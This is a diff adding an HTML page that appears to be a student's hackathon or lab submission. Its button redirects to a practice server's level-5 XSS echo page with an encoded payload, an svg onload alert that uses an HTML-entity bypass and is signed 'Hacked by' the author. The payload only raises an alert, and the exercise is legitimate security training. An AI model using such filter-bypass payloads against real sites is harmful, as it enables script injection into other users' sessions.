@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Trigger Level 5 XSS</title>
+</head>
+<body>
+  <h1>Hackathon 1 – Level 5 XSS Trigger</h1>
+  <button id="trigger">Click to Trigger Level 5 XSS</button>
+
+  <script>
+    document.getElementById('trigger').addEventListener('click', function() {
+      // This URL carries the encoded payload that will run:
+      // <svg onload="&#97;lert('Level 5- Hacked by Thanooj Daggu')">
+      window.location.href =
+        'https://waph-hackathon.eastus.cloudapp.azure.com/xss/level5/echo.php' +
+        '?input=%3Csvg%20onload%3D%22%26%2397%3Blert%28%27level-5%20hacked-by-Thanooj-daggu%27%29%22%3E';
+    });
+  </script>
+</body>
+</html>
